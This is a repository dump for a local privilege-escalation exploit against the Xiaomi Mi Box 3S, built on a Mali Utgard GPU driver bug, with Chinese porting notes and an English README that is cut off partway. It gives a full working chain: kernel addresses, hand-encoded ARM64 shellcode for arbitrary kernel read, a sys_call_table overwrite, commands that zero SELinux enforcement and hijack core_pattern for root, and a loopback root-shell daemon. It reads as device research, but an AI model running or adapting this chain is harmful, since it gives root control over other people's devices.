@@ -1,0 +1,3234 @@
+Project Path: arc_wuying2021_mibox3s-utgard-lpe_htzhhg4e
+
+Source Tree:
+
+```txt
+arc_wuying2021_mibox3s-utgard-lpe_htzhhg4e
+├── FINDING_ADDRESSES.md
+├── LICENSE
+├── Makefile
+├── PORT_MIBOX3S.md
+├── README.md
+├── README.zh-CN.md
+├── root_cmd.sh
+├── roothelper.sh
+├── run.sh
+└── src
+    ├── crash_for_core.c
+    ├── gpu_arb_write.c
+    ├── gpu_scan.c
+    ├── gpwrite.c
+    ├── kfunc.c
+    └── kread.c
+
+```
+
+`FINDING_ADDRESSES.md`:
+
+```md
+# 在没有 root 的固件上定位 `SLOT_PHYS` 与 `KLN_ADDR`
+
+> 适用前提：你已经能在目标上跑通 Utgard 的任意物理写原语（`gpwrite64 place 0` 返回
+> `PLACEMENT OK`），但只有无特权的 `adb shell`（uid 2000）。
+>
+> 本文所有数字和输出都来自 **小米盒子 3S（MDZ-19-AA），build `6.8.22.145`，
+> kernel `3.14.29-301259-g15fb973`**，逐条实测。
+
+---
+
+## 0. 结论先行
+
+| 常量 | 值 |
+|---|---|
+| `SLOT_PHYS` | `1eaf7a0` |
+| `KLN_ADDR` | `ffffffc00111e5a0` |
+
+| 符号 | 虚拟地址 | 物理 |
+|---|---|---|
+| `sys_call_table` | `0xffffffc001eaf000` | `0x1eaf000` |
+| `sys_ni_syscall` | `0xffffffc0010c359c` | |
+| `memcpy` | `0xffffffc0013e0bd0` | |
+| `selinux_enforcing` | `0xffffffc002094ee4` | |
+| `core_pattern` | `0xffffffc001ee4088` | |
+| `_text` / `_etext` | `0xffffffc001080000` / `0xffffffc001d84184` | `0x1080000` / `0x1d84184` |
+| `_sdata` / `_edata` | `0xffffffc001e9a000` / `0xffffffc001fa8560` | `0x1e9a000` / `0x1fa8560` |
+
+与 817 的差别（不能混用）：817 的表在 `0x1ee7000`、`KLN` 在 `0xffffffc00111e5d0`。
+
+---
+
+## 1. 先排除两条走不通的路
+
+**离线解符号：不可行。** 四个 `boot_*.img` 的 kernel 段熵都是 `8.000`，不匹配
+gzip / lz4 / xz / lzma / zstd / bzip2 任何魔数，也搜不到 `ARM\x64`、`Linux version`
+—— Amlogic secure boot，没有 OEM 密钥解不开。
+
+**读 `/proc/kallsyms`：不可行。** 无 root 时 89,246 行地址全是 `0`；`/proc/modules`
+和 `/sys/module/*/sections/*` 同样被 `kptr_restrict=1` 清零（`kallsyms_show_value()`
+要 `CAP_SYSLOG`，而 uid 2000 没有）。
+
+> 顺带：如果手上恰好是没阉掉工厂 `su` 的老固件（145 就是），
+> `echo id | /system/xbin/su` 直接就是 root，再
+> `echo 0 > /proc/sys/kernel/kptr_restrict; echo 1 > /proc/sys/kernel/perf_event_paranoid`
+> 之后 `/proc/kallsyms` 会显示真实地址（3.14 在 `kptr_restrict=0` 时走
+> `kallsyms_for_perf()`）。这条路只对部分老版本成立，下面讲的是通用方法。
+
+---
+
+## 2. 无 root 能拿到的三样东西
+
+```sh
+adb shell cat /proc/iomem
+```
+
+```
+01000000-052fffff : System RAM
+  01080000-01d84183 : Kernel code
+  01e9a000-023e5fff : Kernel data
+  07300000-07307fff : persistent_ram
+```
+
+- **`Kernel code` / `Kernel data` 的物理边界** —— 这是后面扫描的范围来源，普通 shell 就能读。
+- **`/proc/kallsyms` 的符号顺序** —— 地址虽然被清零，但顺序和名字是真的，最后对齐用得上。
+- **`dmesg` 里的 `%p`** —— 3.14 没有指针哈希，`%p` 打的是原始地址（实测有
+  `vinfo:ffffffc001f35a58` 这类）。但这台机器只泄漏数据指针，没有函数地址，所以**不能**直接当种子用。
+
+结论：无 root 时**一个可执行的函数地址都拿不到**。所以不能走"先有种子再扫描"这条路。
+
+---
+
+## 3. 关键前提：physmap 在 EL1 可执行
+
+这是整套方法的核心。arm64 3.14 的内核线性映射是 2MB block，实测解出来的属性是：
+
+```
+L2 block 0x0040000001e00711  ->  PXN=0 (EL1 可执行)  UXN=1  AF=1  AP=0
+```
+
+`PXN=0` 意味着：**用户页面的物理页，在内核线性映射里的那个别名是可以被 EL1 执行的。**
+所以我们可以把"自己写的代码"放进一个自己拥有的页面，然后用
+`0xffffffc000000000 + phys` 当地址交给内核去执行 —— 不需要任何内核符号。
+
+一次性验证（把一条 `ret` 放进页面，看 `syscall(244)` 是否干净返回）：
+
+```sh
+P=$(/data/local/tmp/gpwrite64 place 0 | sed -n 's/.*phys=0x\([0-9a-f]*\).*/\1/p')
+/data/local/tmp/gpwrite64 write $P d65f03c0          # 页首放 ret
+/data/local/tmp/gpwrite64 write 1eaf7a0 ffffffc0$P   # slot 244 -> physmap 别名
+/data/local/tmp/kfunc_new call 244                   # -> nr=244 ret=0x0
+```
+
+---
+
+## 4. 用这个 canary 找 `sys_call_table`
+
+`sys_call_table[244]` 距表首 `244*8 = 0x7a0` 字节。所以对每个候选页 `cand`：
+
+1. 往 `cand + 0x7a0` 写 128 字节 canary（硬件固定写 128 字节）；
+2. 刷缓存（`cache_thrash` 已内置在 `gpwrite64` 里，这一步不能省 —— 表项缓存行常驻，
+   DMA 写下去 CPU 看不到）；
+3. `syscall(244)`，看返回值。
+
+命中的判据不能是"返回值不是 -ENOSYS"，因为 payload 可以主动返回一个魔数。用
+`movz x0,#0x1234 ; ret` 最稳，命中时返回 `0x1234`：
+
+```sh
+# 0xd2824680 = movz x0,#0x1234   0xd65f03c0 = ret
+/data/local/tmp/gpwrite64 write $P d65f03c0d2824680
+```
+
+扫描（页粒度，从 `Kernel data` 起始开始；Android 的 `seq` 不认十六进制，用算术循环）：
+
+```sh
+c=$((0x1e9a000))
+while [ $c -le $((0x1f20000)) ]; do
+  /data/local/tmp/gpwrite64 write $(printf %x $((c+0x7a0))) ffffffc0$P >/dev/null
+  r=$(/data/local/tmp/kfunc_new call 244 | sed -n 's/.*ret=0x//p')
+  if [ "$r" = 1234 ]; then echo "HIT $(printf %x $c)"; break; fi
+  c=$((c+0x1000))
+done
+```
+
+实测：从 `0x1e9a000` 起扫，命中在 `0x1eaf000`（距 `.data` 起始 `+0x15000`，第 22 页），
+于是 `SLOT_PHYS = 0x1eaf7a0`。
+
+**为什么是页粒度**：两个已知固件里 `sys_call_table` 都是页对齐的（145 是 `0x1eaf000`，
+817 是 `0x1ee7000`）。按 `0x1000` 走，每个未命中的候选只污染 `cand+0x7a0` 处的 128 字节；
+按 8 字节走会多出 512 倍的写入量，必然把内核打崩。
+
+**为什么从 `Kernel data` 起始扫**：表在 `.data` 前部（145 偏移 `+0x15000`，817 偏移
+`+0x4D000`），一般几十页内就命中，不用扫整个 4.8MB。
+
+> ⚠️ **扫描前必须先把 slot 244 还原成 `sys_ni_syscall`**，否则上一轮实验留在表项里的
+> canary 会让第一次探测就"命中"，得到一个假地址。我第一次就踩了这个坑：
+>
+> ```sh
+> /data/local/tmp/gpwrite64 write 1eaf7a0 ffffffc0010c359c   # 145 的 sys_ni_syscall
+> /data/local/tmp/kfunc_new call 244                          # 应重新返回 -ENOSYS
+> ```
+
+---
+
+## 5. 从 canary 到任意内核读
+
+页面里放不同的 payload，同一个槽位就有不同的内核能力。**注意槽位永远执行页面里的那段代码，
+参数不匹配会直接把内核打崩**（详见第 8 节）。
+
+**单字读** —— `ldr x0,[x0] ; ret`，读任意地址 8 字节：
+
+```sh
+# 0xf9400000 = ldr x0,[x0]   0xd65f03c0 = ret
+/data/local/tmp/gpwrite64 write $P d65f03c0f9400000
+/data/local/tmp/gpwrite64 write 1eaf7a0 ffffffc0$P
+/data/local/tmp/kfunc_new call 244 0xffffffc001080000
+# -> ret=0x14000010   即 _text 处的 `b` 指令
+```
+
+**批量拷贝** —— 5 条指令，`memcpy(x0=用户缓冲, x1=内核地址, x2=长度)`：
+
+| 偏移 | 指令 | 编码 |
+|---|---|---|
+| +0x00 | `ldrb w3,[x1],#1` | `0x38401423` |
+| +0x04 | `strb w3,[x0],#1` | `0x38001403` |
+| +0x08 | `subs x2,x2,#1` | `0xf1000442` |
+| +0x0c | `b.ne -3`（回到 +0） | `0x54ffffa1` |
+| +0x10 | `ret` | `0xd65f03c0` |
+
+`gpwrite64` 每次写 128 字节的同值，所以要按 **先 +0、再 +8、再 +16** 的顺序写：
+
+```sh
+/data/local/tmp/gpwrite64 write $P         3800140338401423
+/data/local/tmp/gpwrite64 write $(printf %x $((0x$P+8)))  54ffffa1f1000442
+/data/local/tmp/gpwrite64 write $(printf %x $((0x$P+16))) d65f03c0
+```
+
+调用器要能传 3 个寄存器（`kfunc_new call` 只传 1 个），一个十几行的 `kread` 就够：
+
+```c
+unsigned char *buf = mmap(0, 0x4000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
+memset(buf, 0, len);                     /* 先把页触碰进来，否则内核写会缺页 */
+syscall(244, (unsigned long)buf, addr, (unsigned long)len);
+```
+
+实测 32 字节：
+
+```
+$ kread 0xffffffc001080000 32
+1000001400000000000008010000000000603601000000000000000000000000
+```
+
+第一行 16 字节和单字读出来的 `0x14000010 / 0x1080000` 完全对得上。
+
+---
+
+## 6. 解析 `KLN_ADDR`
+
+到这一步你已经能任意读写内核了，`KLN_ADDR` 有两条路：
+
+**路线 A（推荐，根本不需要 `kallsyms_lookup_name`）**：把页面换成自己的 payload 直接干活。
+原链路用 `KLN` 只是为了"拿到任意读写"，而 canary 本身已经是任意代码执行 + 任意读写了。
+`run.sh` 可以整段删掉 stage 0/1/2。
+
+**路线 B（要保住原来的 `KLN` 链路）**：把内核镜像从 RAM 拖下来，离线解析 kallsyms。
+
+1. 用第 5 节的批量拷贝，从 `0x1080000` 起把 `Kernel code` + `Kernel data` 拉到本地
+   （一次 0x10000～0x100000 字节，几十次调用即可，线性映射下物理地址 = 虚拟地址 - `0xffffffc000000000`）；
+2. 在 dump 里找 kallsyms 的**地址数组**：一段长度约等于符号数（145 是 89,246）、
+   单调递增、值都落在 `[0xffffffc001080000, 0xffffffc0023e5fff]` 的 8 字节数组；
+3. 拿 `/proc/kallsyms` 的**顺序**（无 root 也能读）去对齐：第 *i* 行的名字对应数组第 *i* 项；
+4. `kallsyms_lookup_name` 在名字列表里的下标就是它的下标，取数组对应项即可。
+
+> 这一步等价于 `vmlinux-to-elf` 对 vmlinux 做的事，只是数据源换成了运行中的 RAM。
+> 145 上我用有 root 的路子对照过，值是 `0xffffffc00111e5a0`。
+
+---
+
+## 7. 用已知值反向自检
+
+拿到两个常量后，用"写表项 + 解析符号"闭环验证，别信纸面数字：
+
+```sh
+adb push src/kfunc_new /data/local/tmp/ && adb shell chmod 755 /data/local/tmp/kfunc_new
+/data/local/tmp/gpwrite64 write 1eaf7a0 ffffffc00111e5a0   # slot 244 -> kallsyms_lookup_name
+/data/local/tmp/kfunc_new sym memcpy
+# -> memcpy = 0xffffffc0013e0bd0     与 /proc/kallsyms 里的值一致才算对
+/data/local/tmp/kfunc_new sym selinux_enforcing
+# -> selinux_enforcing = 0xffffffc002094ee4
+```
+
+---
+
+## 8. 踩坑清单
+
+1. **`panic_on_oops=1`**：内核里任何一次错误解引用都会直接重启（实测 15 秒起来，`/data` 无损）。
+   `kfunc_new show/dump` 传错地址、或槽位里的 payload 参数不匹配，都会 oops。
+   - 我踩过两次：一是把页表项里的**物理地址**当虚拟地址读；二是槽位里还是"拷贝" payload
+     时用 `call 244 <addr>` 只传了 1 个参数，`x1=0` 让内核读地址 0。
+2. **残留表项会造成假命中**：扫描前一定先把 slot 244 还原成 `sys_ni_syscall`。
+3. **写原语是 128 字节定长**：想摆多打指令的 payload，只能按"从后往前"的顺序分段写。
+4. **`cache_thrash` 不能省**：`sys_call_table` 的缓存行常驻，DMA 写下去 CPU 仍然读旧值，
+   不冲刷就永远扫不中。
+5. **必须 64 位调用**：32 位进程走的是 `.text` 里的 `compat_sys_call_table`，怎么扫都不会命中。
+6. **这台机器的 `/dev/ion` mmap 是坏的**（任何映射都返回 `0x400008`），所以写原语必须用
+   `gpwrite`（普通文件页 + `/proc/self/pagemap` + external 后端），不能用原版 `gpu_arb_write`。
+7. **`sys_call_table` 是页对齐的**这个前提只在这两个固件上验证过；换机型先用页粒度试，
+   不要直接上 8 字节步长。
+
+---
+
+## 9. 硬件无关性说明
+
+第 3 节的 `PXN=0` 是这套方法唯一的硬前提。如果目标固件给线性映射加了 `PXN`（或开了
+`CONFIG_STRICT_KERNEL_RWX` 之外更严的配置），canary 就会变成"一调用就 oops"，那时只能回到
+"先找一个种子地址"的老办法：`dmesg` 里的函数指针、pstore 崩溃转储、串口 console，
+或者干脆先拿一次 root 读 `/proc/kallsyms`。
+
+```
+
+`LICENSE`:
+
+```
+MIT License
+
+Copyright (c) 2026 Yeuoly
+
+Permission is hereby granted, free of charge, to any person obtaining a copy
+of this software and associated documentation files (the "Software"), to deal
+in the Software without restriction, including without limitation the rights
+to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
+copies of the Software, and to permit persons to whom the Software is
+furnished to do so, subject to the following conditions:
+
+The above copyright notice and this permission notice shall be included in all
+copies or substantial portions of the Software.
+
+THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
+IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
+FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
+AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
+LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
+OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
+SOFTWARE.
+
+```
+
+`Makefile`:
+
+```
+# Cross-compilers (override on the command line if yours are named differently)
+CC32 ?= arm-linux-gnueabihf-gcc
+CC64 ?= aarch64-linux-gnu-gcc
+CFLAGS ?= -O1 -static -Wall -Wextra
+
+# Mi Box 3S chain (this firmware): run.sh uses the aarch64 pair.
+# gpwrite64 replaces the ion-based gpu_arb_write because /dev/ion mmap is
+# broken here (every mapping returns 0x400008), and kfunc_new is the 64-bit
+# caller that reaches the real sys_call_table instead of compat_sys_call_table.
+# kread is the 3-argument caller used when re-deriving addresses
+# (FINDING_ADDRESSES.md).  Same sources as upstream, just built for aarch64.
+BINS := gpwrite64 kfunc_new kread crash_for_core gpu_arb_write gpu_scan
+
+.PHONY: all zig clean install
+
+all: gpwrite64 kfunc_new kread crash_for_core
+
+gpwrite64: src/gpwrite.c
+	$(CC64) $(CFLAGS) -o $@ $<
+
+kfunc_new: src/kfunc.c
+	$(CC64) $(CFLAGS) -o $@ $<
+
+kread: src/kread.c
+	$(CC64) $(CFLAGS) -o $@ $<
+
+crash_for_core: src/crash_for_core.c
+	$(CC32) $(CFLAGS) -o $@ $<
+
+# Kept from upstream: the ion-based writer and the address scanner.
+gpu_arb_write: src/gpu_arb_write.c
+	$(CC32) $(CFLAGS) -o $@ $<
+
+gpu_scan: src/gpu_scan.c
+	$(CC32) $(CFLAGS) -o $@ $<
+
+# Same thing via zig, which needs no preinstalled cross toolchain.
+ZIG ?= zig
+zig:
+	ZIG_GLOBAL_CACHE_DIR=$${ZIG_GLOBAL_CACHE_DIR:-/tmp/zigcache} $(ZIG) cc \
+		-target aarch64-linux-musl $(CFLAGS) -o gpwrite64 src/gpwrite.c
+	ZIG_GLOBAL_CACHE_DIR=$${ZIG_GLOBAL_CACHE_DIR:-/tmp/zigcache} $(ZIG) cc \
+		-target aarch64-linux-musl $(CFLAGS) -o kfunc_new src/kfunc.c
+	ZIG_GLOBAL_CACHE_DIR=$${ZIG_GLOBAL_CACHE_DIR:-/tmp/zigcache} $(ZIG) cc \
+		-target aarch64-linux-musl $(CFLAGS) -o kread src/kread.c
+	ZIG_GLOBAL_CACHE_DIR=$${ZIG_GLOBAL_CACHE_DIR:-/tmp/zigcache} $(ZIG) cc \
+		-target arm-linux-musleabihf $(CFLAGS) -o crash_for_core src/crash_for_core.c
+	ZIG_GLOBAL_CACHE_DIR=$${ZIG_GLOBAL_CACHE_DIR:-/tmp/zigcache} $(ZIG) cc \
+		-target arm-linux-musleabihf $(CFLAGS) -o gpu_arb_write src/gpu_arb_write.c
+	ZIG_GLOBAL_CACHE_DIR=$${ZIG_GLOBAL_CACHE_DIR:-/tmp/zigcache} $(ZIG) cc \
+		-target arm-linux-musleabihf $(CFLAGS) -o gpu_scan src/gpu_scan.c
+
+# Push to a device that is already reachable over adb.
+PUSH := gpwrite64 kfunc_new kread crash_for_core run.sh roothelper.sh root_cmd.sh
+install: all
+	adb push $(PUSH) /data/local/tmp/
+	adb shell 'cd /data/local/tmp && chmod 755 $(PUSH)'
+
+clean:
+	rm -f $(BINS)
+
+```
+
+`PORT_MIBOX3S.md`:
+
+```md
+# Mi Box 3S（MDZ-19-AA / `queenchristina`）移植记录
+
+> 目标：小米盒子 3S，build `8.2.2.817`，Android **6.0.1**（SDK 23），
+> 内核 `3.14.29-301318-g9206404`（2018-02-02 构建），armv8l，
+> SELinux **Enforcing**，安全补丁级别 2017-04-01。
+> 结果：**uid=0(root)，context `u:r:kernel:s0`，`CapEff 0000001fffffffff`**。
+
+根因与 MiTV4 相同（Amlogic 派生 Utgard 的
+`mali_mem_validation_check()` 被编译成 `return _MALI_OSK_ERR_OK`），
+`/dev/mali`、`/dev/ion` 均为 0666，因此任意本地进程都能获得
+「任意物理地址 128 字节写」。
+
+## 本固件的地址常量
+
+| 符号 / 位置 | 值 |
+|---|---|
+| `sys_call_table` 物理基址 | `0x1ee7000`（虚拟 `0xffffffc001ee7000`） |
+| `sys_call_table[244]` 物理 | **`0x1ee77a0`** |
+| `kallsyms_lookup_name` | `0xffffffc00111e5d0`（size `0xa0`） |
+| `memcpy` | `0xffffffc0013e1270` |
+| `selinux_enforcing` | `0xffffffc0020cff24` |
+| `core_pattern` | `0xffffffc001f1c0c8` |
+
+段边界（`/proc/iomem`）：code `0x1080000–0x1dbd183`，
+rodata `0x1dbd184–0x1ed3fff`，Kernel data `0x1ed4000–0x2421fff`。
+
+## 移植时踩到的三个坑（重要）
+
+### 1. `/dev/ion` 的 mmap 在这个固件上是坏的
+
+任何对 ion/dma-buf fd 的 `mmap()`（包括 `MAP_FIXED`）都返回 **`0x400008`**：
+
+```
+ion_map fd   mmap(NULL) = 0x400008 errno=0
+share fd     mmap(NULL) = 0x400008 errno=0
+raw mmap2    = 0x400008
+mmap(FIXED)  = 0x400008
+```
+
+原版 `gpu_arb_write` 用 ion 分配命令缓冲区，`build_shader()` 往这个地址一写就
+段错误——**GPU job 根本没提交**。表现就是「写原语时好时坏」，偶发成功只是因为
+`0x400008` 恰好落在该进程已映射的段里。之前所有基于它的扫描都是空转。
+
+**绕过办法**（`src/gpwrite.c`）：命令缓冲区改用普通文件页自己 mmap（正常地址），
+物理地址从 `/proc/self/pagemap` 取，再用 `MALI_IOC_MEM_BIND` 的
+**external 后端**绑到 `CMD_VA`，提交前用 `__ARM_NR_cacheflush` 刷 D-cache。
+
+### 2. 64 位 / 32 位走的是两张不同的表
+
+| 调用者 | 使用的表 | 位置 |
+|---|---|---|
+| 32 位 | `compat_sys_call_table` | `.text` |
+| **64 位** | `sys_call_table` | `.data`/`.rodata` |
+
+扫描器与「调内核函数」的 helper **必须是 64 位**，否则检测的是另一张表，
+永远不可能命中。
+
+### 3. `sys_call_table` 的缓存行是热的 —— GPU 写下去看不到
+
+`sys_call_table` 每次系统调用都会被读，缓存行常驻 L1/L2。GPU 是 DMA 写，
+**不经过 CPU 缓存**：内存改了、CPU 仍从缓存取旧值，`syscall(244)` 继续走
+`sys_ni_syscall`。如果没有这一步，扫遍整个 `.data`/`.rodata` 都不会命中
+（实测同一页无冲刷扫过、有冲刷才中）。
+
+**对策**：写入后、调用前，走 8MB 缓冲把缓存冲刷一遍，强制该行换出重载。
+`kfunc_new` 与 `gpwrite64` 的调用路径都已内置 `cache_thrash()`。
+
+## 复现链路
+
+```
+# 0) 推工具
+adb push gpwrite64 kfunc_new crash_for_core roothelper.sh root_cmd.sh /data/local/tmp/
+adb shell chmod 755 /data/local/tmp/{gpwrite64,kfunc_new,crash_for_core,roothelper.sh,root_cmd.sh}
+
+# 1) slot 244 -> kallsyms_lookup_name
+gpwrite64 write 1ee77a0 ffffffc00111e5d0            # (64 位进程，内部会冲刷缓存)
+
+# 2) 解析 memcpy（槽位是 kallsyms_lookup_name 时的用法）
+kfunc_new sym memcpy        # -> 0xffffffc0013e1270
+
+# 3) slot 244 -> memcpy，得到任意内核读写
+gpwrite64 write 1ee77a0 ffffffc0013e1270
+
+# 4) 关 SELinux（必须走 CPU 侧写，GPU 写对热变量无效）
+kfunc_new zero 0xffffffc0020cff24 4
+getenforce                  # -> Permissive
+
+# 5) core_pattern -> root
+kfunc_new str 0xffffffc001f1c0c8 '|/data/local/tmp/roothelper.sh'
+/data/local/tmp/crash_for_core      # 触发带 core 的崩溃
+cat /data/local/tmp/root_out.txt    # uid=0(root) context=u:r:kernel:s0
+```
+
+## 日常怎么用这个 root
+
+`roothelper.sh` 被内核以 root 拉起后会做两件事：把常驻的 **root shell 守护进程
+`rsd`** 起起来（监听 `127.0.0.1:4444`，仅回环，不暴露到局域网），并按需执行
+`/data/local/tmp/root_cmd.sh`。所以拿到 root 后最顺手的用法是：
+
+```sh
+# 一条 root 命令
+adb shell "echo 'id' | /data/local/tmp/rsh"
+
+# 交互式 root shell（提示符不会显示，但每条命令都以 uid=0 执行）
+adb shell /data/local/tmp/rsh
+# 例：
+#   cp /system/etc/hosts /data/local/tmp/hosts.bak
+#   setprop persist.adb.tcp.port 5555
+#   dmesg | tail
+
+# 不想走 adb shell 的话，把回环口转发到电脑：
+adb forward tcp:4444 tcp:4444
+# 然后用 PuTTY / nc / PowerShell TcpClient 连 127.0.0.1:4444
+```
+
+`rsd` 只监听回环，且随重启消失；重启后先跑一次
+`adb shell sh /data/local/tmp/reroot.sh`（它会重新打通链路并顺手把 `rsd`
+再拉起来）。
+
+需要一次性跑一段脚本（而不是交互）时，也可以写 `/data/local/tmp/root_cmd.sh`
+再触发一次 `crash_for_core`，结果会落到 `/data/local/tmp/root_out.txt`。
+
+## 工具说明
+
+| 文件 | 作用 |
+|---|---|
+| `src/gpwrite.c` | ion-free 的任意物理 128 字节写；`place` 自检、`write`、`scan`（带冲刷的槽位探测） |
+| `src/kfunc.c` | 通过 slot 244 调内核函数：`sym` / `zero` / `str` / `show` / `call` / `bt`（`%pS` 符号化 oracle）/ `dump` |
+| `tools/crash_for_core.c` | 设置 RLIMIT_CORE 并触发 SIGSEGV，驱动 `core_pattern` |
+| `tools/roothelper.sh` | 以 root 执行 `/data/local/tmp/root_cmd.sh` |
+
+换到别的固件（尤其是**没有 root** 的版本）怎么重新定位这两个常量，见
+[`FINDING_ADDRESSES.md`](FINDING_ADDRESSES.md)。
+
+`kfunc_new bt <addr>` 是一个**只读的符号化探针**：伪造 `pt_regs` 交给
+`dump_backtrace`，内核用 `%pS` 把任意地址打成 `symbol+off/size`，
+不执行、不会崩 —— 移植到新固件时用它来找 `kallsyms_lookup_name`
+（注意 `sp` 不能 16K 对齐，否则 `unwind_frame()` 的区间校验会失败）。
+
+## 持久化：为什么这台机器做不到「重启后仍 root」
+
+所有改动（`sys_call_table` 表项、`selinux_enforcing`、`core_pattern`）都在 RAM，
+重启即还原。想要持久的 setuid `su`，只能放进 `/system`，但：
+
+- `/system` 挂在 `/dev/block/dm-0`，`dmesg` 明确打印
+  `fs_mgr: Enabling dm-verity for system (mode 0)`，只读；改它会导致下次开机
+  校验失败；
+- `/data` 与 `/cache` 都是 `nosuid,nodev` 挂载，放 setuid 二进制无效；
+- 关 verity 需要改 boot 分区的 ramdisk（fstab 里的 `verify` 标记），但
+  **这个固件的 boot 镜像是加密的**：从设备 dump 出的 `boot.img` 中
+  kernel 段熵 `8.000`、ramdisk 段熵 `7.999`，且不匹配 gzip/lz4/xz 任何魔数
+  （Amlogic secure boot）。没有 OEM 密钥就无法重新生成 bootloader 接受的镜像；
+- `ro.build.type=user`、`ro.debuggable=0` ⇒ adbd 不能以 root 跑，
+  标准的 `adb disable-verity` 也用不了。
+
+因此本机的现实做法是**每次开机重跑一遍**（5 秒）：
+
+```
+adb shell sh /data/local/tmp/reroot.sh
+```
+
+`reroot.sh` 会重新写表项、关 SELinux、设 `core_pattern` 并触发 coredump，
+最后把 `uid=0` 的结果写进 `/data/local/tmp/reroot.log`。
+`/data/local/tmp/su`（静态、setgid/setuid(0) 后 exec `/system/bin/sh`）已经准备好，
+一旦哪天 verity 被关闭，直接 `cp` 到 `/system/xbin/su` 并 `chmod 4755` 即可。
+
+**例外是 tvagent 的开机自启**，它不依赖 root 持久化：`flash_recovery` 的
+`u:r:install_recovery:s0` 域建不了 socket、不能 `setexec`/`setenforce`/`setprop`、
+看不到 `/dev/mali`、也进不了 `/data/local/tmp`，所以 `install-recovery.sh` 那条路
+在 enforcing 下走不通。可行位置是 console shell 的 `/system/etc/mkshrc`
+（`u:r:shell:s0`，开机由 `on property:ro.debuggable=1` 拉起），里面用
+`su 0` 把 agent 拉进 `u:r:su:s0`。但**必须等 `sys.boot_completed=1` 之后再起**
+——console shell 比 system_server 还早，agent 从第一秒就每 3 秒跑一次
+`dumpsys activity`，1 GB 的盒子会被拖死在开机 logo。
+延迟启动后实测：重启 ~33 s `boot_completed=1`，~41 s agent 在 `:8765` 监听。
+完整证据、部署与回滚见 [AGENT_AUTOSTART.md](AGENT_AUTOSTART.md)。
+
+## 备份
+
+已通过 root 通道把 boot-critical 分区 dump 到设备的 `/data/local/tmp/backup/`，
+并拉回电脑的 `backup/`：
+
+| 文件 | 大小 | 说明 |
+|---|---|---|
+| `boot.img` | 20 MB | `ANDROID!` 头有效，kernel 0x6a3800 / ramdisk 0xe1800 / page 0x800；内容加密 |
+| `recovery.img` | 32 MB | `ANDROID!` 头有效，内容同样加密 |
+| `bootloader.img` | 4 MB | |
+| `env.img` | 4 MB | u-boot 环境 |
+| `misc.img` | 32 MB | BCB |
+| `logo.img` | 3 MB | |
+| `persist.img` | 8 MB | |
+| `tee.img` | 8 MB | |
+| `reserved.img` | 8 MB | |
+
+注意：这些备份**只在设备还能起来、还能跑 adb 时才有意义**；它们救不了刷坏的
+boot 分区（recovery 里没有可用的 adb shell，手上也没有 8.2.2.817 的完整固件）。
+
+## 与 MiTV4 的差异
+
+| 项 | MiTV4 | Mi Box 3S |
+|---|---|---|
+| Android | 6.0.1 | 6.0.1（build 号是小米自己的 `8.2.2.817`） |
+| `sys_call_table` 物理 | `0x1f6f000` | `0x1ee7000` |
+| `kallsyms_lookup_name` | `0xffffffc00111f308` | `0xffffffc00111e5d0` |
+| `memcpy` | `0xffffffc0013e75c0` | `0xffffffc0013e1270` |
+| `selinux_enforcing` | `0xffffffc0021697bc` | `0xffffffc0020cff24` |
+| `core_pattern` | — | `0xffffffc001f1c0c8` |
+
+地址不能跨固件照抄：MiTV4 的 `0x111f308` 在这台机器上落在
+`do_acct_process.isra.4+0x368` 里。用 `bt` oracle 先验证再使用。
+
+```
+
+`README.md`:
+
+```md
+# MiBox3S (Amlogic Utgard) — local privilege escalation via unvalidated external memory bind
+
+**English** | [简体中文](README.zh-CN.md)
+
+> **Origins.** This repository started as a fork of
+> [Yeuoly/mitv4-utgard-lpe](https://github.com/Yeuoly/mitv4-utgard-lpe) (MIT), which
+> documents the same driver bug on a Xiaomi MiTV4 (S905L2). That work builds in turn on
+> the original public research, [lr-m/RIPMaliUtgard](https://github.com/lr-m/RIPMaliUtgard)
+> — see §9. Upstream prose is kept where it still applies; the Mi Box 3S sections, the
+> commands in §1 and the build steps in §8 are this repo's. Added files: `src/gpwrite.c`,
+> `src/kread.c`, `PORT_MIBOX3S.md`, `FINDING_ADDRESSES.md`.
+>
+> **Target.** Xiaomi Mi Box 3S (MDZ-19-AA, build `8.2.2.817`, Android 6.0.1, kernel
+> `3.14.29-301318-g9206404`). `run.sh` already carries that firmware's two constants
+> (`SLOT_PHYS=1ee77a0`, `KLN_ADDR=ffffffc00111e5d0`) and drives the aarch64 helpers this
+> `Makefile` builds; §2.2 and [PORT_MIBOX3S.md](PORT_MIBOX3S.md) explain why the MiTV4
+> addresses used in the rest of this document do not apply to it.
+
+A complete, verified chain that turns an unprivileged `adb shell` (uid 2000,
+`u:r:shell:s0`) into `uid=0` with SELinux permissive on a **Xiaomi Mi Box 3S**
+(MDZ-19-AA, Amlogic S905X, Mali-400, Utgard DDK) — and, with its own two constants, on a
+**MiTV4** (S905L2) as described in §2.1.
+
+The kernel-side footprint is tiny: **132 bytes** (`128 + 4`). No ROP, no heap
+spray, no KASLR bypass, no CVE.
+
+> **Read the scope and disclaimer at the end before running anything.**
+
+---
+
+## 1. TL;DR
+
+```
+# sys_call_table[244..259] is 16 consecutive sys_ni_syscall slots nobody calls.
+# One GPU write fills all 16 with one address; the kernel then dispatches
+# syscall 244 straight into that function (arm64: 8-byte entries, args in x0..x5,
+# return in x0; no PAN on this SoC so the kernel can read our user buffers).
+
+# --- Mi Box 3S, build 8.2.2.817: the constants run.sh ships ---
+gpwrite64 write 1ee77a0 ffffffc00111e5d0  # slots -> kallsyms_lookup_name
+kfunc_new sym memcpy                      # -> 0xffffffc0013e1270   (the resolver)
+
+gpwrite64 write 1ee77a0 <memcpy>          # same slots -> memcpy
+kfunc_new zero  0xffffffc0020cff24 4      # selinux_enforcing -> 0
+kfunc_new str   0xffffffc001f1c0c8 '|/data/local/tmp/roothelper.sh'
+crash_for_core                            # coredump -> kernel runs the helper as root
+```
+
+On a MiTV4 the same chain uses that build's two constants
